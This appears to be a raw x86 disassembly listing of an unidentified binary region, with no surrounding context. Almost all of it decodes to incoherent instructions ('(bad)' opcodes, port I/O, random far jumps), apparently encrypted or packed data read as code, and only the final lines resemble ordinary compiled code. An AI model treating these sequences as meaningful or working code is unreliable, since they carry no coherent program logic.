  417be0:	loope  0x417b8e
  417be2:	sub    BYTE PTR [edx-0x6],dl
  417be5:	pushf  
  417be6:	dec    esp
  417be7:	cmp    esp,ebx
  417be9:	pop    edx
  417bea:	push   ds
  417beb:	js     0x417bbd
  417bed:	push   0x49506afa
  417bf2:	int3   
  417bf3:	adc    eax,DWORD PTR [ebx]
  417bf5:	call   0x7f4c545d
  417bfa:	retf   0x315d
  417bfd:	dec    eax
  417bfe:	fldenv [ebx]
  417c00:	xchg   ebx,eax
  417c01:	out    0xd0,al
  417c03:	ja     0x417c2c
  417c05:	call   0x28fe:0x2259b87a
  417c0c:	xchg   edx,eax
  417c0d:	inc    eax
  417c0e:	cmp    al,BYTE PTR [esi-0x55433429]
  417c14:	jecxz  0x417ba1
  417c16:	mov    ds:0xb79449d7,al
  417c1b:	clc    
  417c1c:	cmp    BYTE PTR ds:0xbb51e1be,dl
  417c22:	xchg   edi,eax
  417c23:	inc    edi
  417c24:	lock push eax
  417c26:	lds    ebx,FWORD PTR [esi]
  417c28:	idiv   BYTE PTR ds:0x603dfbaa
  417c2e:	mov    ah,0x24
  417c30:	fwait
  417c31:	les    eax,FWORD PTR [eax+0x3e]
  417c34:	mov    eax,0x9a0bc29a
  417c39:	out    0x68,al
  417c3b:	sbb    al,0x79
  417c3d:	(bad)  
  417c3e:	cld    
  417c3f:	rcr    DWORD PTR [ebx+0x34485b5c],cl
  417c45:	mov    edi,0x70ea5551
  417c4a:	clc    
  417c4b:	ins    DWORD PTR es:[edi],dx
  417c4c:	fst    DWORD PTR gs:[ebx+0x7e]
  417c50:	shl    DWORD PTR [ebp-0x1],0x32
  417c54:	jp     0x417bde
  417c56:	stos   DWORD PTR es:[edi],eax
  417c57:	aam    0xd7
  417c59:	int    0xdc
  417c5b:	leave  
  417c5c:	fist   DWORD PTR [ecx+0x28]
  417c5f:	push   ebp
  417c60:	xor    bl,ch
  417c62:	aaa    
  417c63:	jne    0x417cd6
  417c65:	leave  
  417c66:	aam    0xe
  417c68:	(bad)  
  417c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c6a:	jne    0x417c2c
  417c6c:	and    DWORD PTR [ebp+0x68ce9bce],eax
  417c72:	div    BYTE PTR [ecx-0x39]
  417c75:	std    
  417c76:	cld    
  417c77:	mov    al,ds:0x19b7032d
  417c7c:	call   0x59d62930
  417c81:	or     dh,dl
  417c83:	popa   
  417c84:	test   eax,0x73b70d55
  417c89:	shl    al,1
  417c8b:	test   cl,dh
  417c8d:	(bad)  
  417c8e:	or     ecx,esp
  417c90:	pop    ebp
  417c91:	or     DWORD PTR [eax],esp
  417c93:	test   al,0xa0
  417c95:	and    al,0xaf
  417c97:	test   al,0xf5
  417c99:	or     ah,BYTE PTR [eax-0x587fffc7]
  417c9f:	xchg   edx,eax
  417ca0:	inc    edx
  417ca1:	nop
  417ca2:	xchg   ecx,eax
  417ca3:	aam    0x23
  417ca5:	ins    BYTE PTR es:[edi],dx
  417ca6:	out    dx,al
  417ca7:	add    bl,BYTE PTR [edx]
  417ca9:	pop    ebx
  417caa:	xlat   BYTE PTR ds:[ebx]
  417cab:	scas   eax,DWORD PTR es:[edi]
  417cac:	imul   esi,DWORD PTR [edi],0x7c
  417caf:	xor    BYTE PTR [ecx+0x10],0x72
  417cb3:	sub    eax,ebp
  417cb5:	dec    ecx
  417cb6:	inc    ebx
  417cb7:	adc    bh,BYTE PTR [ecx+0x12]
  417cba:	ret    0xe731
  417cbd:	xchg   ebp,eax
  417cbe:	xchg   esi,eax
  417cbf:	addr16 retf 
  417cc1:	mov    edi,0x21e744a2
  417cc6:	xlat   BYTE PTR ds:[ebx]
  417cc7:	push   ds
  417cc8:	push   0xffffffe5
  417cca:	ins    DWORD PTR es:[edi],dx
  417ccb:	mov    ah,0x4e
  417ccd:	add    eax,0xf3f8fd42
  417cd2:	mov    fs,WORD PTR [ebp+0x1d]
  417cd5:	sahf   
  417cd6:	xchg   esp,edi
  417cd8:	out    0x4c,al
  417cda:	mov    esp,0x993812dc
  417cdf:	dec    BYTE PTR [ebx]
  417ce1:	jge    0x417d58
  417ce3:	rol    DWORD PTR [ecx],0xf6
  417ce6:	int3   
  417ce7:	nop
  417ce8:	dec    ebx
  417ce9:	call   0xd1a0:0x1e69bde1
  417cf0:	sub    edx,DWORD PTR [eax+0x76]
  417cf3:	jmp    0xd75bbd53
  417cf8:	ja     0x417d0f
  417cfa:	cs jns 0x417c8c
  417cfd:	and    al,0x96
  417cff:	push   esi
  417d00:	sub    eax,0x15a19d80
  417d05:	push   edi
  417d06:	mov    BYTE PTR [esi+0x74],cl
  417d09:	cmp    al,0xbb
  417d0b:	dec    eax
  417d0c:	je     0x417c96
  417d0e:	aas    
  417d0f:	nop
  417d10:	shr    DWORD PTR [esi+0x73],cl
  417d13:	dec    edi
  417d14:	mov    esp,0x23b1d788
  417d19:	push   ebp
  417d1a:	jno    0x417cf6
  417d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d1d:	nop
  417d1e:	sub    edi,esp
  417d20:	push   ds
  417d21:	retf   0xc170
  417d24:	popf   
  417d25:	jno    0x417d08
  417d27:	(bad)  
  417d28:	loop   0x417d85
  417d2a:	aad    0xeb
  417d2c:	push   edx
  417d2d:	and    bl,cl
  417d2f:	jae    0x417d7a
  417d31:	mov    edi,0xb31e6cd8
  417d36:	push   ebp
  417d37:	inc    ebx
  417d38:	ja     0x417cc3
  417d3a:	neg    BYTE PTR [edi-0x5d]
  417d3d:	push   ebp
  417d3e:	das    
  417d3f:	mov    esp,0x8d7d0899
  417d44:	xchg   ebp,eax
  417d45:	sub    BYTE PTR [edx-0x26],cl
  417d48:	add    dh,BYTE PTR [ebp-0x7773754f]
  417d4e:	xor    al,0x15
  417d50:	mov    eax,ds:0x70eaef4c
  417d55:	mov    edx,0xfedd1a9
  417d5a:	popa   
  417d5b:	cmp    eax,0x270f2eaf
  417d60:	dec    esp
  417d61:	pop    ds
  417d62:	into   
  417d63:	nop
  417d64:	sub    DWORD PTR ss:[ebx-0x420857ff],eax
  417d6b:	add    eax,0x35299610
  417d70:	mov    al,0xd8
  417d72:	jno    0x417db0
  417d74:	mov    DWORD PTR [ebx+0x48],ebp
  417d77:	mov    eax,ds:0x7f7b900f
  417d7c:	in     eax,dx
  417d7d:	scas   al,BYTE PTR es:[edi]
  417d7e:	std    
  417d7f:	jno    0x417ded
  417d81:	ins    BYTE PTR es:[edi],dx
  417d82:	mov    al,0xc1
  417d84:	into   
  417d85:	sub    cl,BYTE PTR [edx+edi*4]
  417d88:	fst    QWORD PTR [edx+esi*4]
  417d8b:	fst    QWORD PTR [eax-0x4b4180aa]
  417d91:	push   ebx
  417d92:	inc    ebp
  417d93:	pop    edx
  417d94:	mov    edx,0xc81312b9
  417d99:	jge    0x417db9
  417d9b:	in     eax,0xb
  417d9d:	jb     0x417da8
  417d9f:	xchg   esp,eax
  417da0:	test   BYTE PTR [ecx-0x6d31cd83],bh
  417da6:	mov    ecx,eax
  417da8:	push   edi
  417da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417daa:	popf   
  417dab:	lods   eax,DWORD PTR ds:[esi]
  417dac:	inc    esi
  417dad:	shl    BYTE PTR [edi+0x797b1b9d],0x87
  417db4:	add    eax,0x75546b90
  417db9:	or     dl,ah
  417dbb:	mov    ch,0x94
  417dbd:	push   ecx
  417dbe:	dec    edi
  417dbf:	iret   
  417dc0:	mov    ch,dh
  417dc2:	(bad)  
  417dc3:	loope  0x417dd8
  417dc5:	pop    es
  417dc6:	test   al,0x87
  417dc8:	mov    dh,0xb9
  417dca:	cld    
  417dcb:	add    BYTE PTR [eax+0x63fc5afc],al
  417dd1:	mov    ebp,0x23390e9e
  417dd6:	sqrtps xmm6,xmm3
  417dd9:	rdtsc  
  417ddb:	or     edi,ebx
  417ddd:	jno    0x417dc8
  417ddf:	and    BYTE PTR [ecx+edi*2-0x38],ch
  417de3:	mov    ecx,0x1227124f
  417de8:	or     ebx,DWORD PTR [edi+edi*8]
  417deb:	sti    
  417dec:	pop    ds
  417ded:	mov    al,ds:0xd813ce07
  417df2:	sti    
  417df3:	mov    ebp,0x8a9347ec
  417df8:	add    ah,BYTE PTR [ecx-0x26]
  417dfb:	add    eax,0x15cfd6f6
  417e00:	jmp    0x417e76
  417e02:	gs sbb al,bl
  417e05:	loopne 0x417dc4
  417e07:	shl    DWORD PTR [ecx],0x86
  417e0a:	fsubrp st(3),st
  417e0c:	or     BYTE PTR [ebx-0x4be0cb79],0xaf
  417e13:	ficomp DWORD PTR [edx]
  417e15:	js     0x417dc4
  417e17:	sbb    edx,edx
  417e19:	rcl    DWORD PTR [edi+0x66fa416d],0x5b
  417e20:	popf   
  417e21:	(bad)  
  417e22:	daa    
  417e23:	cwde   
  417e24:	mov    eax,0x6eafc8ce
  417e29:	lods   al,BYTE PTR ds:[esi]
  417e2a:	arpl   WORD PTR [edi+0x7ae2bbc1],cx
  417e30:	leave  
  417e31:	gs pop es
  417e33:	cmp    eax,0xd5ea5e5e
  417e38:	test   cl,bl
  417e3a:	add    DWORD PTR [eax+0x78f48a6c],ebp
  417e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e41:	jl     0x417e5a
  417e43:	adc    edx,esi
  417e45:	aaa    
  417e46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e47:	fsubr  st,st(0)
  417e49:	push   edx
  417e4a:	pop    ebx
  417e4b:	push   eax
  417e4c:	test   dh,al
  417e4e:	mov    WORD PTR [edx],gs
  417e50:	fdiv   QWORD PTR [eax-0x1d]
  417e53:	sbb    ebp,DWORD PTR [ebx]
  417e55:	lods   eax,DWORD PTR ds:[esi]
  417e56:	pop    edi
  417e57:	mov    eax,0xe84bcd8c
  417e5c:	aaa    
  417e5d:	pop    ebp
  417e5e:	iret   
  417e5f:	or     eax,0xea917326
  417e64:	retf   
  417e65:	je     0x417e5d
  417e67:	cmp    dl,BYTE PTR [edi+0x2de2b54f]
  417e6d:	inc    esi
  417e6e:	pop    ecx
  417e6f:	leave  
  417e70:	cli    
  417e71:	pop    ebx
  417e72:	out    dx,eax
  417e73:	cmp    eax,0x2f34a9d4
  417e78:	mov    esp,0x896f9f99
  417e7d:	ja     0x417e6c
  417e7f:	scas   al,BYTE PTR es:[edi]
  417e80:	loopne 0x417edb
  417e82:	inc    edx
  417e83:	sub    BYTE PTR ds:0x8da8237d,cl
  417e89:	test   eax,0xd5bb51ac
  417e8e:	push   eax
  417e8f:	jbe    0x417e2d
  417e91:	xor    eax,DWORD PTR [ecx+esi*1+0x3f1e3b35]
  417e98:	call   0x3e375aab
  417e9d:	xchg   edx,eax
  417e9e:	mov    ecx,0x54f7aae7
  417ea3:	push   esp
  417ea4:	xchg   BYTE PTR [eax],cl
  417ea6:	fcomp  DWORD PTR [edi]
  417ea8:	cld    
  417ea9:	jmp    0x417e2d
  417eab:	and    DWORD PTR [edi-0x22],eax
  417eae:	or     cl,0xea
  417eb1:	cli    
  417eb2:	fisubr WORD PTR [ebx-0x2af93db2]
  417eb8:	sbb    cl,al
  417eba:	xor    al,0x4e
  417ebc:	shl    esp,cl
  417ebe:	push   esp
  417ebf:	mov    ds:0xe6c94305,al
  417ec4:	out    dx,al
  417ec5:	pop    es
  417ec6:	inc    edx
  417ec7:	cmovle edi,DWORD PTR [edi-0x18]
  417ecb:	mov    esp,0x622bc589
  417ed0:	jmp    0x417ee3
  417ed2:	pusha  
  417ed3:	xadd   BYTE PTR [ebx-0x73],dh
  417ed7:	sbb    BYTE PTR [edx+0x6a],bl
  417eda:	scas   al,BYTE PTR es:[edi]
  417edb:	fidivr DWORD PTR [eax-0x690fe9a9]
  417ee1:	enter  0x357e,0x3f
  417ee5:	scas   al,BYTE PTR es:[edi]
  417ee6:	das    
  417ee7:	cdq    
  417ee8:	xor    eax,DWORD PTR [ebx+ebp*1+0x76]
  417eec:	jmp    0x9c16:0x9fc3ad50
  417ef3:	xchg   ebp,eax
  417ef4:	pusha  
  417ef5:	cwde   
  417ef6:	mov    cl,0xb8
  417ef8:	jae    0x417edd
  417efa:	sub    BYTE PTR [esi+0x20facf6],dl
  417f00:	sbb    DWORD PTR [ecx-0x39],ebx
  417f03:	mov    bl,0x1e
  417f05:	or     bh,bl
  417f07:	inc    edx
  417f08:	sub    ah,BYTE PTR [ebx]
  417f0a:	fwait
  417f0b:	mov    ds:0xb270e3da,al
  417f10:	pushf  
  417f11:	ror    dh,cl
  417f13:	aas    
  417f14:	jno    0x417f90
  417f16:	mov    eax,0x93120f80
  417f1b:	bound  esp,QWORD PTR [eax+0x6d]
  417f1e:	cmp    al,BYTE PTR ds:0x69f0ed71
  417f24:	f2xm1  
  417f26:	jg     0x417f63
  417f28:	push   ebx
  417f29:	dec    ebx
  417f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f2b:	jp     0x417f3d
  417f2d:	sub    DWORD PTR [eax],esi
  417f2f:	or     cl,BYTE PTR [ebp+0x47fa6b49]
  417f35:	pop    ss
  417f36:	mov    ds:0xf166bc97,al
  417f3b:	push   ebp
  417f3c:	mov    WORD PTR [esi+0x295834d6],ss
  417f42:	mov    al,0x35
  417f44:	rcr    ebx,0xe2
  417f47:	(bad)  
  417f48:	lock mov ah,0x62
  417f4b:	mov    al,ds:0x8dd08a19
  417f50:	ins    BYTE PTR es:[edi],dx
  417f51:	pop    ss
  417f52:	jns    0x417eed
  417f54:	test   eax,0xb3d0cfe8
  417f59:	(bad)  
  417f5a:	dec    ebp
  417f5b:	outs   dx,BYTE PTR ds:[esi]
  417f5c:	fstp   QWORD PTR [ebp+0x2b9fe7bd]
  417f62:	adc    ah,BYTE PTR gs:[esi+0x2c]
  417f66:	or     ecx,DWORD PTR [ecx]
  417f68:	fcmovu st,st(0)
  417f6a:	pop    ss
  417f6b:	sar    DWORD PTR [edx+0x42dda14d],0xb1
  417f72:	and    ebp,DWORD PTR [edx+0x7e90a1bc]
  417f78:	add    al,0x6d
  417f7a:	cmp    al,0x28
  417f7c:	sti    
  417f7d:	int    0x10
  417f7f:	or     DWORD PTR ds:0x2f394281,0x77d0e6df
  417f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f8a:	adc    eax,0xf0059fa0
  417f8f:	push   esi
  417f90:	repnz and DWORD PTR [ebx+0x41],ebp
  417f94:	fsubr  st,st(0)
  417f96:	dec    eax
  417f97:	sar    ch,0x3a
  417f9a:	sub    esp,DWORD PTR [edx-0x6c]
  417f9d:	lods   al,BYTE PTR ds:[esi]
  417f9e:	lods   eax,DWORD PTR ds:[esi]
  417f9f:	push   edx
  417fa0:	lock daa 
  417fa2:	xchg   ebp,eax
  417fa3:	nop
  417fa4:	mov    edx,0x26e6a23b
  417fa9:	loopne 0x417f35
  417fab:	imul   edi,DWORD PTR [ecx],0xfffffffa
  417fae:	lods   al,BYTE PTR ds:[esi]
  417faf:	gs jmp 0x417fda
  417fb2:	test   al,0xdf
  417fb4:	add    al,0x0
  417fb6:	mov    eax,ds:0xc137dad4
  417fbb:	jge    0x417f89
  417fbd:	mov    eax,ds:0x327f58d
  417fc2:	or     edx,DWORD PTR [eax-0x126e0fc6]
  417fc8:	ins    DWORD PTR es:[edi],dx
  417fc9:	jne    0x418045
  417fcb:	cdq    
  417fcc:	call   0xabb1087a
  417fd1:	fidiv  WORD PTR [ebp-0x65]
  417fd4:	mov    BYTE PTR [ecx+0x7f],dl
  417fd7:	nop
  417fd8:	into   
  417fd9:	movntq QWORD PTR [ebx-0x78],mm1
  417fdd:	ret    
  417fde:	pop    bx
  417fe0:	jne    0x418055
  417fe2:	outs   dx,DWORD PTR ds:[esi]
  417fe3:	mov    esp,0xd1524c0c
  417fe8:	jb     0x41804e
  417fea:	mov    dl,0x6
  417fed:	xchg   ecx,eax
  417fee:	and    al,BYTE PTR [eax+esi*2]
  417ff1:	fadd   DWORD PTR [edi-0x344f07fd]
  417ff7:	dec    eax
  417ff8:	sub    BYTE PTR [ebx-0x76],dh
  417ffb:	jecxz  0x417fb8
  417ffd:	sar    BYTE PTR [ebp-0x6d815752],1
  418003:	mov    al,ds:0x6b00937b
  418008:	lds    edi,FWORD PTR [ebx+ebx*4+0x18065549]
  41800f:	inc    eax
  418010:	fbld   TBYTE PTR [ecx-0x10]
  418013:	sysexit 
  418015:	adc    DWORD PTR [ecx-0x3534c9cd],ebx
  41801b:	out    dx,al
  41801c:	inc    esi
  41801d:	fistp  WORD PTR [edi]
  41801f:	cmp    bl,BYTE PTR [ecx-0x2f]
  418022:	lock ja 0x41804b
  418025:	sahf   
  418026:	addr16 jae 0x418064
  418029:	sar    DWORD PTR [ebx],0x15
  41802c:	cdq    
  41802d:	dec    ebp
  41802e:	mov    WORD PTR [eax+0x65],gs
  418031:	sbb    ecx,esi
  418033:	idiv   esi
  418035:	xor    eax,0xc4045d43
  41803a:	jo     0x418013
  41803c:	cwde   
  41803d:	xchg   edi,eax
  41803e:	loope  0x418061
  418040:	push   edi
  418041:	popa   
  418042:	in     eax,dx
  418043:	pusha  
  418044:	repnz adc BYTE PTR [edi+0x50],bl
  418048:	std    
  418049:	sub    ecx,DWORD PTR ds:0x928c307f
  41804f:	stc    
  418050:	sbb    ch,cl
  418052:	cmp    ch,ch
  418054:	pop    es
  418055:	mov    bh,0x2d
  418057:	dec    ebp
  418058:	in     al,0x9c
  41805a:	xchg   ecx,ebp
  41805c:	dec    esi
  41805d:	xchg   edx,eax
  41805e:	lods   eax,DWORD PTR ds:[esi]
  41805f:	fst    QWORD PTR [ebx-0x6ec9d378]
  418065:	in     al,0xe0
  418067:	push   0x64
  418069:	out    0x44,eax
  41806b:	rcl    DWORD PTR [ebx-0x1d],cl
  41806e:	dec    esi
  41806f:	cdq    
  418070:	or     DWORD PTR [edi-0x68],edx
  418073:	jle    0x41804c
  418075:	retf   0x2e97
  418078:	call   0xb9db:0x45c8cd44
  41807f:	or     eax,0x59eb35bf
  418084:	ins    BYTE PTR es:[edi],dx
  418085:	sbb    al,0x74
  418087:	js     0x41802f
  418089:	fcomp  QWORD PTR [edx]
  41808b:	cmp    al,0xf2
  41808d:	xor    ebp,edi
  41808f:	sbb    al,0xb7
  418091:	adc    cl,dh
  418093:	stos   DWORD PTR es:[edi],eax
  418094:	push   ss
  418095:	mov    esp,0x2553aa33
  41809a:	in     al,0xb
  41809c:	dec    edi
  41809d:	addr16 jle 0x41803a
  4180a0:	add    cl,BYTE PTR [eax]
  4180a2:	lods   al,BYTE PTR ds:[esi]
  4180a3:	adc    DWORD PTR [ebx-0x29df033b],esp
  4180a9:	mov    ah,dh
  4180ab:	xor    al,0x1
  4180ad:	es push edi
  4180af:	xor    eax,0x95df50b6
  4180b4:	fwait
  4180b5:	xchg   BYTE PTR [ebp+0x5a1b3e10],al
  4180bb:	or     al,BYTE PTR [ecx-0x54]
  4180be:	push   ds
  4180bf:	sti    
  4180c0:	xor    esi,ebx
  4180c2:	add    DWORD PTR [ecx-0x215f7e4f],edx
  4180c8:	mov    al,0x24
  4180ca:	mov    cl,0x1e
  4180cc:	test   al,0x2e
  4180ce:	(bad)  
  4180cf:	gs out dx,eax
  4180d1:	xchg   edx,eax
  4180d2:	lahf   
  4180d3:	ror    DWORD PTR [edi+0x10044be4],cl
  4180d9:	xchg   ebx,eax
  4180da:	call   0x2da1:0xe847513b
  4180e1:	aad    0x7c
  4180e3:	push   edx
  4180e4:	mov    eax,0x24c0b11e
  4180e9:	mov    bl,0xc7
  4180eb:	shl    bh,1
  4180ed:	push   edi
  4180ee:	bound  eax,QWORD PTR [ecx]
  4180f0:	pusha  
  4180f1:	outs   dx,DWORD PTR ds:[esi]
  4180f2:	cmp    BYTE PTR [ebp+0x6395faba],al
  4180f8:	sbb    eax,0x725097bc
  4180fd:	(bad)
  418100:	cwde   
  418101:	cmp    DWORD PTR [eax+0x6c485336],esi
  418107:	sub    BYTE PTR [ecx],dh
  418109:	mov    bh,BYTE PTR [ecx]
  41810b:	inc    edi
  41810c:	mov    WORD PTR [esi-0x6c277b97],?
  418112:	(bad)  
  418113:	mov    dh,0x4e
  418115:	mov    bx,0xb727
  418119:	iret   
  41811a:	les    edi,FWORD PTR [edx+0x32]
  41811d:	xchg   edx,eax
  41811e:	mov    BYTE PTR [ecx+eiz*8-0x44],dl
  418122:	lahf   
  418123:	das    
  418124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418125:	mov    al,ds:0x82618ce3
  41812a:	sub    eax,0x1525c719
  41812f:	fsubr  st(4),st
  418131:	inc    edi
  418132:	shl    DWORD PTR es:[edi],0xe4
  418136:	pop    ds
  418137:	xor    esi,DWORD PTR fs:[esi+0x6]
  41813b:	xchg   BYTE PTR [ecx+0x747b44b6],al
  418141:	lds    ecx,FWORD PTR [edi-0x2d588d8c]
  418147:	enter  0xd02c,0x5a
  41814b:	jl     0x418124
  41814d:	daa    
  41814e:	mov    cl,0x84
  418150:	out    0x6b,eax
  418152:	std    
  418153:	push   0x76
  418155:	jmp    0x41818c
  418157:	dec    edi
  418158:	cdq    
  418159:	cmp    eax,0x4dba1fe1
  41815e:	in     al,dx
  41815f:	scas   eax,DWORD PTR es:[edi]
  418160:	sub    al,0x5d
  418162:	fild   WORD PTR [esi]
  418164:	pop    esi
  418165:	pop    edi
  418166:	add    edi,edx
  418168:	mov    dl,0xaa
  41816a:	pop    ss
  41816b:	pop    ebx
  41816c:	mov    dh,0x96
  41816e:	pop    ecx
  41816f:	adc    edx,DWORD PTR [ecx-0x1b]
  418172:	pop    ds
  418173:	fcmovnb st,st(2)
  418175:	mov    esi,0x5c65fe39
  41817a:	sbb    dh,bl
  41817c:	rcl    ch,cl
  41817e:	add    al,0x94
  418180:	hlt    
  418181:	icebp  
  418182:	gs mov dl,0x39
  418185:	jecxz  0x41811a
  418187:	push   0xb3a61df9
  41818c:	aad    0x23
  41818e:	mov    BYTE PTR fs:[edi+0x7c],ah
  418192:	call   0xb0:0x45801216
  418199:	pop    esp
  41819a:	push   0xffffffe5
  41819c:	retf   
  41819d:	ja     0x41815e
  41819f:	add    al,0x0
  4181a1:	cmp    al,bl
  4181a3:	sbb    al,0x48
  4181a5:	xchg   ebp,eax
  4181a6:	push   0x660ee3f9
  4181ab:	mov    ds:0x38426038,al
  4181b0:	cmc    
  4181b1:	mov    bh,0x1b
  4181b3:	cmp    DWORD PTR [esi+0x71],esi
  4181b6:	nop
  4181b7:	fcom   QWORD PTR [edx+0x5faeba9b]
  4181bd:	mov    ch,0x58
  4181bf:	mov    ds:0x5899924,al
  4181c4:	(bad)  
  4181c5:	cmp    DWORD PTR [ebx],edi
  4181c7:	fsubrp st(2),st
  4181c9:	jmp    0x4181ea
  4181cb:	stos   BYTE PTR es:[edi],al
  4181cc:	mov    ch,0x97
  4181ce:	cmp    ch,cl
  4181d0:	bound  ebx,QWORD PTR [edx+0x651863be]
  4181d6:	jmp    0x6a8b:0xb8744764
  4181dd:	mov    edi,0xf87f5e21
  4181e2:	into   
  4181e3:	sub    DWORD PTR [ebx],0xffffffe6
  4181e6:	ret    0xe332
  4181e9:	and    eax,esp
  4181eb:	xchg   esp,eax
  4181ec:	(bad)  
  4181ed:	jecxz  0x41826c
  4181ef:	dec    ebx
  4181f0:	pop    es
  4181f1:	int    0xa8
  4181f3:	xor    eax,0x19c26222
  4181f8:	push   es
  4181f9:	and    ah,BYTE PTR [ecx+0x4bffa617]
  4181ff:	xor    eax,DWORD PTR [ebp-0x14cc5d45]
  418205:	mov    ds:0x8a39bb66,eax
  41820a:	mov    edx,0x8a3058de
  41820f:	sbb    esp,DWORD PTR [esi+0x28]
  418212:	aad    0x90
  418214:	loope  0x4181d5
  418216:	out    0x35,eax
  418218:	mov    BYTE PTR [eax],cl
  41821a:	mov    al,0x9a
  41821c:	lock (bad) 
  41821e:	xlat   BYTE PTR ds:[ebx]
  41821f:	ins    DWORD PTR es:[edi],dx
  418220:	sub    eax,0xc21ea2b2
  418225:	test   bl,0xc8
  418228:	leave  
  418229:	rcl    DWORD PTR [ebx+0x74],0x2
  41822d:	jae    0x41825f
  41822f:	sbb    BYTE PTR [edi-0x4952fa86],ah
  418235:	cld    
  418236:	adc    BYTE PTR [esi+0x5],0x7e
  41823a:	jno    0x4181e1
  41823c:	icebp  
  41823d:	sbb    ch,ah
  41823f:	fldcw  WORD PTR [eax+0x6e]
  418242:	in     eax,dx
  418243:	jne    0x4181e7
  418245:	call   0x2d2:0xeb196f08
  41824c:	in     eax,0xf8
  41824e:	jecxz  0x418282
  418250:	mov    esp,0x31b7d34f
  418255:	aas    
  418256:	xlat   BYTE PTR ds:[ebx]
  418257:	repz mov fs,WORD PTR [edi+0x7061c5a3]
  41825e:	push   ebx
  41825f:	xchg   esp,eax
  418260:	cmc    
  418261:	mov    ah,0xa
  418263:	test   eax,0x8afe3404
  418268:	inc    ebp
  418269:	xor    ah,0xd
  41826c:	adc    edi,DWORD PTR [edi+0x69]
  41826f:	jb     0x4182cb
  418271:	in     eax,dx
  418272:	and    ecx,ebx
  418274:	sbb    al,0x23
  418276:	push   ecx
  418277:	retf   0x8b3b
  41827a:	sbb    BYTE PTR [edx+0x43f83f0a],bh
  418280:	es and DWORD PTR ss:[edx+0x1d],esp
  418285:	mov    bh,BYTE PTR [esi-0x7e]
  418288:	jnp    0x418291
  41828a:	inc    ebp
  41828b:	adc    edi,ebx
  41828d:	ss scas al,BYTE PTR es:[edi]
  41828f:	dec    esi
  418290:	push   ecx
  418291:	jle    0x4182c2
  418293:	xchg   DWORD PTR [ebp+0x13],ebp
  418296:	outs   dx,DWORD PTR ds:[esi]
  418297:	inc    ebx
  418298:	cdq    
  418299:	push   ds
  41829a:	cmp    ch,BYTE PTR [edi]
  41829c:	mov    edi,0xcf9f0b2a
  4182a1:	or     DWORD PTR [ebp+edi*4+0xbee34c8],edx
  4182a8:	jns    0x418301
  4182aa:	repnz lea esp,[edx]
  4182ad:	int    0x62
  4182af:	add    ebp,DWORD PTR [esi-0x7cdfdfbb]
  4182b5:	sub    edx,0x23f1453d
  4182bb:	xchg   ecx,eax
  4182bc:	addr16 je 0x4182d4
  4182bf:	mov    esp,0x26e3dc23
  4182c4:	cmc    
  4182c5:	out    dx,al
  4182c6:	daa    
  4182c7:	xchg   esi,eax
  4182c8:	mov    eax,ds:0xa2b08ee7
  4182cd:	loope  0x41827c
  4182cf:	aaa    
  4182d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182d1:	xchg   edi,eax
  4182d2:	out    0x3f,al
  4182d4:	cmp    ah,BYTE PTR [esi-0x68b9f39d]
  4182da:	dec    ebp
  4182db:	mov    bl,0xde
  4182dd:	out    0x4,al
  4182df:	cmovae esi,edx
  4182e2:	xchg   ebp,eax
  4182e3:	xor    ebx,DWORD PTR [edi+ecx*1]
  4182e6:	dec    edi
  4182e7:	std    
  4182e8:	sbb    al,BYTE PTR [ecx]
  4182ea:	sbb    BYTE PTR [ebp-0x6b],ch
  4182ed:	test   eax,0x12d83db1
  4182f2:	cmp    eax,0xc6f67343
  4182f7:	lahf   
  4182f8:	jnp    0x418316
  4182fa:	and    ebx,DWORD PTR [eax+esi*4+0x48a0f21]
  418301:	or     eax,edi
  418303:	inc    eax
  418304:	lss    ebp,FWORD PTR [eax+0x65189eaa]
  41830b:	in     eax,dx
  41830c:	pop    ebp
  41830d:	das    
  41830e:	inc    esi
  41830f:	int    0x6e
  418311:	dec    eax
  418312:	fisubr DWORD PTR [ebx]
  418314:	cdq    
  418315:	add    ebp,DWORD PTR [edi+edi*2-0x2e50dee2]
  41831c:	xchg   ebp,eax
  41831d:	jnp    0x418300
  41831f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418320:	inc    esi
  418321:	iret   
  418322:	adc    edi,DWORD PTR [ecx+eax*2]
  418325:	lds    edi,FWORD PTR [ebp+edi*2-0x72]
  418329:	xor    DWORD PTR [edx-0x21],ebx
  41832c:	(bad)  
  41832d:	jno    0x418345
  41832f:	adc    eax,0xacec32a8
  418334:	mov    ch,0x48
  418336:	mov    dh,0xc6
  418338:	and    eax,0x79d25b4f
  41833d:	repnz pop esi
  41833f:	adc    al,0x72
  418341:	cmc    
  418342:	fadd   st(3),st
  418344:	stc    
  418345:	push   0xa1c83fb7
  41834a:	out    0xd6,eax
  41834c:	pop    esp
  41834d:	mov    eax,ds:0xf506aa1
  418352:	rcr    ch,0xe1
  418355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418356:	push   edx
  418357:	inc    ecx
  418358:	shr    bl,1
  41835a:	dec    edi
  41835b:	lods   eax,DWORD PTR ds:[esi]
  41835c:	cwde   
  41835d:	std    
  41835e:	mul    BYTE PTR [edx]
  418360:	add    DWORD PTR [ebx],0x4457979d
  418366:	jmp    0x2196:0xde890855
  41836d:	jecxz  0x4183ed
  41836f:	xchg   edi,eax
  418370:	stos   BYTE PTR es:[edi],al
  418371:	stc    
  418372:	clc    
  418373:	xchg   esi,eax
  418374:	in     al,0x94
  418376:	fcmovnb st,st(6)
  418378:	sub    al,bl
  41837a:	push   0x397aad1a
  41837f:	lahf   
  418380:	fdiv   QWORD PTR [esi]
  418382:	fldln2 
  418384:	shr    BYTE PTR [ebx+0x37],0xf
  418388:	test   ecx,esi
  41838a:	mov    eax,0x558bffff
  41838f:	hlt    
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
